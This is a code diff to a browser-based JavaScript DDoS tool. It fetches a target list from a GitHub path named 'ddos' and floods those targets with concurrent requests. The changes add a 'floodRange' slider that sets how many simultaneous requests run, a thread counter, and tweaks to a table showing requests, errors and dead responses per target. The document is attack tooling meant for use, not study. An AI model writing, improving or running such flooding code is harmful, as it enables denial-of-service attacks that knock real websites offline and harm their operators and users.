@@ -5,12 +5,23 @@ const NO_RESPONSE_SYMBOL = "☠️";
 const targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/';
 const updateInterval = 500;
 const fetchTimeout = 1000;
-const CONCURRENCY_LIMIT = 5000;
-const RESULTS_NUM = 15
+var CONCURRENCY_LIMIT = 1000;
+const RESULTS_NUM = 10
 
-var targetStats = {}
 var statsEl = document.getElementById('stats');
 var descEl = document.getElementById('description');
+var slider = document.getElementById("floodRange");
+var concurStat = document.getElementById("currentConcurrency");
+
+var targetStats = {}
+var queue = []
+
+slider.oninput = function () {
+    CONCURRENCY_LIMIT = this.value;
+    while (queue.length > CONCURRENCY_LIMIT) {
+        queue.pop();
+    }
+}
 
 function getRandomInt(max) {
     return Math.floor(Math.random() * max);
@@ -18,7 +29,7 @@ function getRandomInt(max) {
 
 function printStats() {
     for (var [target, stats] of Object.entries(targetStats)) {
-        stats.last_responses = stats.last_responses.slice(-RESULTS_NUM)
+        stats.last_responses = stats.last_responses.slice(-RESULTS_NUM);
     }
     var table_body = Object.entries(targetStats).map(
         ([target, { number_of_requests, number_of_errored_responses, last_responses }]) =>
@@ -30,12 +41,12 @@ function printStats() {
             '</td><td>' + number_of_errored_responses +
             '</td><td>' + last_responses.join('') +
             '</td></tr>'
-    ).join('')
-    statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th><th>Responses</th></tr></thead><tbody>' + table_body + '</tbody></table>'
+    ).join('');
+    statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th><th>Responses</th></tr></thead><tbody>' + table_body + '</tbody></table>';
+    concurStat.innerHTML = 'Threads: ' + queue.length + '/' + CONCURRENCY_LIMIT;
 }
 setInterval(printStats, updateInterval);
 
-var queue = []
 async function fetchWithTimeout(resource, options) {
     const controller = new AbortController();
     const id = setTimeout(() => controller.abort(), options.timeout);
